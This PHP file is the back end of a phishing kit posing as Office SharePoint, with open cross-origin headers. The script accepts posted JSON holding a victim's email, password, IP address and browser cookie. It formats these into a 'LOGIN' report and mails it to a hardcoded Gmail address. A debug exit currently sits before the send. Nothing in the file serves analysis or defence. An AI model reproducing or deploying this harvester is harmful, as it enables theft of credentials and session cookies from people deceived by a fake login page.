<?php
error_reporting(1);
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: x-test-header, Origin, X-Requested-With, Content-Type, Accept");
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 604800');

$content_raw = file_get_contents("php://input"); 
$data = json_decode($content_raw, true);
$message = $headers = "";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
if($data["email"] != "" and $data["password"] != ""){
    $message .= "-------------- LOGIN -----------------------\n";
    $message .= "\n";
    $message .= "Email: ".$data['email']."\n";
    $message .= "Password: ".$data['password']."\n";
    $message .= "Date: ".date("Y-m-d H:i:s")."\n";
    $message .= "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "\n";
    $message .= "|Client IP2:  ".json_encode($data['ip'])."\n";
    $message .= "\n";
    $message .= "|--------------- COOKIE -------------------|\n";
    $message .= "\n";
    $message .= "|Client cookie:  ".$data['cookie']."\n";
    $message .= "\n";
    $message .= "|----------- END --------------|\n";
    $recipient = "pcollinsomb@gmail.com";
    $sender = "Office sharepoint L0Gs<d4rkl4b.pw>";
    $subject = "Office sharepoint  \n";
    var_dump($message);exit;
    $mail = mail($recipient, $subject,$message, $headers);
    var_dump($mail);
    }
    
